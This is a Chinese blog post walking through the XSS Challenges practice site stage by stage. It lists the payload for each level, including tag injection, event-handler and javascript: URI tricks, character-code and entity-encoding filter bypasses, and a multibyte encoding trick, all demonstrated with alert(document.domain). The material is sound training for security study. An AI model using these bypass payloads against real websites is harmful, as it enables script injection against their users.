<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>XSS Challenges · damn1t</title><meta name="description" content="XSS Challenges平台地址： https://xss-quiz.int21h.jp
11&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;
21&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">damn1t</a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"><li><a href="https://twitter.com/www.baidu.com"><i class="fa fa-twitter"></i></a></li><li><a href="http://weibo.com/www.baidu.com"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>XSS Challenges</a></h3></div><div class="post-content"><h1 id="XSS-Challenges"><a href="#XSS-Challenges" class="headerlink" title="XSS Challenges"></a>XSS Challenges</h1><p>平台地址： <a href="https://xss-quiz.int21h.jp" target="_blank" rel="noopener">https://xss-quiz.int21h.jp</a></p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;</span><br></pre></td></tr></table></figure>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>当在search框输入的时候，发现对<code>&lt;</code>和<code>&gt;</code>进行了编码，所以将注意点转入到右边选择框，利用右键检查元素，将<strong>japan</strong>改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>查看源码，发现了一个<strong>hidden</strong>的输入框，查看元素，输入上述exp</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>查看搜索框，限制了maxlength，将其改为50<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>还是尖括号编码，并且只有一个输入框，很烦，提示是事件处理，找了一下关于<strong>input</strong>的时间处理，找到一个<a href="https://www.runoob.com/jsref/event-oninput.html" target="_blank" rel="noopener">oninput</a>，所以检查元素，然后修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oninput=&quot;javascript:alert(document.domain);&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>同6相同的方法</p>
<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>要求输入一个url，没有任何处理，于是直接利用伪协议：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure></p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>发现第6是个万能解法<br>方法2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>没过滤尖括号，嘿嘿，过滤了<strong>domain</strong>,用一段js编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str = &apos;document.domain&apos;</span><br><span class="line">output = &apos;&apos;</span><br><span class="line">for(var i = 0;i&lt;str.length;i++)&#123;</span><br><span class="line">	output +=str.charCodeAt(i)+&apos;,&apos;</span><br><span class="line">&#125;</span><br><span class="line">console.log(output)</span><br></pre></td></tr></table></figure></p>
<p>然后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110)))&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p>把<strong>s</strong>转义为<strong>xs</strong>，过滤规则如下</p>
<blockquote>
<p>Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”</p>
</blockquote>
<pre><code>&quot;&gt;&lt;iframe src=&quot;javascr&amp;#09;ipt:alert(document.domain);&quot;&gt;&lt;/iframe&gt;
&quot;&gt;&lt;iframe src=&quot;javas&amp;#99;ript:alert(document.domain);&quot;&gt;&lt;/iframe&gt;
</code></pre><p>但是没地址</p>
<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>地址：<a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=62c192a540aba87e7b6796ce0cbc2cd93fcb0750" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_no012.php?sid=62c192a540aba87e7b6796ce0cbc2cd93fcb0750</a><br>规则：</p>
<blockquote>
<p>“s/[\x00-\x20\&lt;>\”\’]//g;</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``onmouseover=alert(document.domain);</span><br></pre></td></tr></table></figure>
<p>仅在ie上可以</p>
<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>有问题</p>
<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p><strong>注：由于题目有点古老，所以建议使用ie8内核的浏览器</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cos:expres/**/sion(if(!window.x)&#123;alert(document.domain);window.x=1;&#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p>由于转义了<code>&lt;&gt;</code>、<code>&quot;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e</span><br></pre></td></tr></table></figure></p>
<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e</span><br></pre></td></tr></table></figure>
<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p>贴他人的wp：</p>
<blockquote>
<p>看答案，这一题似乎较为复杂，和日语编码有关；并且新版本的IE都已经修复了。</p>
<p>提示：multi-byte character</p>
<p>euc-jp的编码范围：</p>
<p>byte 1為8E時, 為2 byte編碼, byte 2範圍為A1-DF</p>
<p>byte 1範圍為A1-FE時, 為2 byte編碼, byte 2範圍為A1-FE</p>
<p>byte 1為8F時為3 byte編碼, byte 2與byte 3範圍均為A1-FE</p>
<p>两个表单元素都提交%A7闭合最后的双引号，查看源码成功了，为什么UI上去没成功？无奈直接在地址栏：javascript:alert(document.domain);</p>
<p>现在发现原来是浏览器版本问题，别用IE8了过这个。</p>
<p>p1=1%A7&amp;p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7</p>
<p>干脆跳过拉倒。</p>
</blockquote>
<h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p>ie5或者6，再见</p>
<h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p>处理代码是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">//&lt;![CDATA[</span><br><span class="line">(function(g)&#123;var a=location.href.split(&quot;#!&quot;)[1];if(a)&#123;g.location=g.HBR=a.replace(/:/gi,&quot;&quot;);&#125;&#125;)(window);</span><br><span class="line">//]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>有个hint是：</p>
<blockquote>
<p>Twitter DomXss at Sep 24, 2010</p>
</blockquote>
<p>多半是这个：<a href="https://news.softpedia.com/news/Twitter-Messes-Up-XSS-Bug-Fix-Three-Times-157969.shtml" target="_blank" rel="noopener">https://news.softpedia.com/news/Twitter-Messes-Up-XSS-Bug-Fix-Three-Times-157969.shtml</a><br>不过内核问题解决不了<br>预计解决方案：<code>/#!javascript:alert(document.domain);&quot;</code></p>
<p>reference：<br><a href="https://www.codercto.com/a/33998.html" target="_blank" rel="noopener">https://www.codercto.com/a/33998.html</a><br><a href="https://www.cnblogs.com/go2bed/p/4131222.html" target="_blank" rel="noopener">https://www.cnblogs.com/go2bed/p/4131222.html</a></p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-05-03</span><i class="fa fa-tag"></i><a class="tag" href="/tags/xss-practice/" title="xss practice">xss practice </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/05/03/靶机/xss-quiz/,damn1t,XSS Challenges,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/05/03/靶机/hack the box邀请码获取和web challenge/" title="hack the box邀请码获取和web challenge">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/05/01/靶机/leopold/" title="leopold 靶机渗透">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>